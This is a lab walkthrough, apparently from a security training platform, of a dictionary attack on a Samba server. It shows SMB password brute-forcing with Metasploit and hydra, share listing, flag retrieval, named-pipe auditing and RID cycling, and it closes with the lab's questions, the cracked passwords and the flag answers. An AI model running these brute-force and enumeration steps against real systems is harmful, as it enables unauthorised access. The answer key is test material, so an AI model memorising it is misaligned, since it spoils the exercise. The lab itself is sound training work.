#### 4. Samba Recon: Dictionary Attack

----

```sh
root@attackdefense:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
1878: eth0@if1879: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:0a:01:01:08 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.1.8/24 brd 10.1.1.255 scope global eth0
       valid_lft forever preferred_lft forever
1881: eth1@if1882: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:75:f6:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.117.246.2/24 brd 192.117.246.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# nmap -sC -sV 192.117.246.3
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-24 09:17 UTC
Nmap scan report for 21kx65ekbrcpmmnvkpk7nlgr2.temp-network_a-117-246 (192.117.246.3)
Host is up (0.000014s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: RECONLABS)
MAC Address: 02:42:C0:75:F6:03 (Unknown)
Service Info: Host: SAMBA-RECON-BRUTE

Host script results:
|_nbstat: NetBIOS name: SAMBA-RECON-BRU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: victim-1
|   NetBIOS computer name: SAMBA-RECON-BRUTE\x00
|   Domain name: \x00
|   FQDN: victim-1
|_  System time: 2019-07-24T09:18:00+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-07-24 09:18:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# msfconsole
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target address range or CIDR identifier
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.117.246.3
RHOSTS => 192.117.246.3
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set SMBUser jane
SMBUser => jane
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 192.117.246.3:445     - 192.117.246.3:445 - Starting SMB login bruteforce
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:admin',
[!] 192.117.246.3:445     - No active DB -- Credential data will not be saved!
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:123456',
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:12345',
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:123456789',
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:password',
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:iloveyou',
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:princess',
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:1234567',
[-] 192.117.246.3:445     - 192.117.246.3:445 - Failed: '.\jane:12345678',
[+] 192.117.246.3:445     - 192.117.246.3:445 - Success: '.\jane:abc123'
[*] 192.117.246.3:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) >
```

----

```sh
root@attackdefense:~# cd /usr/share/wordlists/
root@attackdefense:/usr/share/wordlists# gzip -d rockyou.txt.gz
root@attackdefense:/usr/share/wordlists# less rockyou.txt
root@attackdefense:/usr/share/wordlists# cd
root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.117.246.3 smb
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-07-24 09:23:26
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.117.246.3:445/
[445][smb] host: 192.117.246.3   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2019-07-24 09:23:28
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# smbmap -H 192.117.246.3 -u admin -p password1
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.117.246.3...
[+] IP: 192.117.246.3:445       Name: 21kx65ekbrcpmmnvkpk7nlgr2.temp-network_a-117-246
        Disk                                                    Permissions
        ----                                                    -----------
        shawn                                                   READ, WRITE
        nancy                                                   READ ONLY
        admin                                                   READ, WRITE
        IPC$                                                    NO ACCESS
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# smbclient -L 192.117.246.3 -U jane
Enter WORKGROUP\jane's password:

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk
        nancy           Disk
        admin           Disk
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS
root@attackdefense:~#
```

```sh
root@attackdefense:~# smbclient //192.117.246.3/jane -U jane
Enter WORKGROUP\jane's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  flag                                D        0  Tue Nov 27 19:25:12 2018
  logs                                D        0  Tue Nov 27 19:25:12 2018
  admin                               D        0  Tue Nov 27 19:25:12 2018

                1981832052 blocks of size 1024. 1464581064 blocks available
smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  flag                                N       33  Tue Nov 27 19:25:12 2018

                1981832052 blocks of size 1024. 1464581032 blocks available
smb: \flag\> get flag
getting file \flag\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
smb: \flag\> exit
root@attackdefense:~# 
```

```sh
root@attackdefense:~# cat flag
16cb5a2bebf654439291fc9b73b0a6d0
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# smbclient //192.117.246.3/admin -U admin
Enter WORKGROUP\admin's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 24 09:24:51 2019
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  hidden                              D        0  Tue Nov 27 19:25:12 2018

                1981832052 blocks of size 1024. 1464580576 blocks available
smb: \> cd hidden
smb: \hidden\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Wed Jul 24 09:24:51 2019
  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018

                1981832052 blocks of size 1024. 1464580552 blocks available
smb: \hidden\> get flag.tar.gz
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (147.4 KiloBytes/sec) (average 147.5 KiloBytes/sec)
smb: \hidden\> exit
root@attackdefense:~# 
```

```sh
root@attackdefense:~# ls
README  flag.tar.gz  tools  wordlists
```

```sh
root@attackdefense:~# tar xzf flag.tar.gz
root@attackdefense:~# ls
README  flag  flag.tar.gz  tools  wordlists
root@attackdefense:~# 
```

```sh
root@attackdefense:~# cat flag
2727069bc058053bd561ce372721c92e
root@attackdefense:~#
```

----

```sh
root@attackdefense:~# msfconsole
msf5 > use auxiliary/scanner/smb/pipe_auditor
msf5 auxiliary(scanner/smb/pipe_auditor) > show options

Module options (auxiliary/scanner/smb/pipe_auditor):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target address range or CIDR identifier
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/pipe_auditor) > set RHOSTS 192.117.246.3
RHOSTS => 192.117.246.3
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBUser admin
SMBUser => admin
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBPass password1
SMBPass => password1
msf5 auxiliary(scanner/smb/pipe_auditor) > run

[+] 192.117.246.3:139     - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] 192.117.246.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/pipe_auditor) >
```

----

```sh
root@attackdefense:~# enum4linux -r -u "admin" -p "password1" 192.117.246.3
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 24 09:38:30 2019

 ==========================
|    Target Information    |
 ==========================
Target ........... 192.117.246.3
RID Range ........ 500-550,1000-1050
Username ......... 'admin'
Password ......... 'password1'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 192.117.246.3    |
 =====================================================
[+] Got domain/workgroup name: RECONLABS

 ======================================
|    Session Check on 192.117.246.3    |
 ======================================
[+] Server 192.117.246.3 allows sessions using username 'admin', password 'password1'

 ============================================
|    Getting domain SID for 192.117.246.3    |
 ============================================
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ========================================================================
|    Users on 192.117.246.3 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3690628376-3985617143-2159776750
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username 'admin', password 'password1'
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3690628376-3985617143-2159776750 and logon username 'admin', password 'password1'
S-1-5-21-3690628376-3985617143-2159776750-500 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-501 SAMBA-RECON-BRUTE\nobody (Local User)
S-1-5-21-3690628376-3985617143-2159776750-502 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-503 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-504 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-505 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-506 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-507 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-508 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-509 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-510 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-511 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-512 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-513 SAMBA-RECON-BRUTE\None (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-514 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-515 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-516 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-517 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-518 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-519 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-520 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-521 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-522 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-523 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-524 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-525 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-526 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-527 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-528 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-529 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-530 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-531 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-532 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-533 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-534 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-535 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-536 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-537 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-538 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-539 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-540 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-541 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-542 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-543 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-544 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-545 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-546 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-547 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-548 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-549 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-550 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1000 SAMBA-RECON-BRUTE\shawn (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1001 SAMBA-RECON-BRUTE\jane (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1002 SAMBA-RECON-BRUTE\nancy (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1003 SAMBA-RECON-BRUTE\admin (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1004 SAMBA-RECON-BRUTE\Maintainer (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1005 SAMBA-RECON-BRUTE\Reserved (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1006 SAMBA-RECON-BRUTE\Testing (Local Group)
S-1-5-21-3690628376-3985617143-2159776750-1007 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1008 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1009 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1010 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1011 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1012 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1013 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1014 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1015 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1016 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1017 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1018 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1019 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1020 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1021 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1022 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1023 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1024 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1025 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1026 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1027 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1028 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1029 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1030 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1031 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1032 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1033 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1034 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1035 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1036 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1037 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1038 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1039 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1040 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1041 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1042 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1043 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1044 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1045 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1046 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1047 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1048 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1049 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-2 and logon username 'admin', password 'password1'
S-1-22-2-1000 Unix Group\admins (Domain Group)
S-1-22-2-1001 Unix Group\Maintainer (Domain Group)
S-1-22-2-1002 Unix Group\Reserved (Domain Group)
S-1-22-2-1003 Unix Group\Testing (Domain Group)
enum4linux complete on Wed Jul 24 09:38:50 2019

root@attackdefense:~#
```

----

- What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist `/usr/share/wordlists/metasploit/unix_passwords.txt`

```
# auxiliary/scanner/smb/smb_login
abc123
```

- What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: `/usr/share/wordlists/rockyou.txt`

```
# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.117.246.3 smb
password1
```

- Which share is read only? Use smbmap with credentials obtained in question 2.

```
# smbmap -H 192.117.246.3 -u admin -p password1
nancy
```

- Is share “jane” browseable? Use credentials obtained from the 1st question.

```
# smbclient -L 192.117.246.3 -U jane
$ smbclient //192.117.246.3/jane -U jane
No
```

- Fetch the flag from share “admin”

```
# smbclient //192.117.246.3/admin -U admin
2727069bc058053bd561ce372721c92e
```

- List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.

```
# auxiliary/scanner/smb/pipe_auditor
netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc
```

- List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.

```sh
# enum4linux -r -u "admin" -p "password1" 192.117.246.3
S-1-22-1-1000, S-1-22-1-1001, S-1-22-1-1002, S-1-22-1-1003
```

----

EOF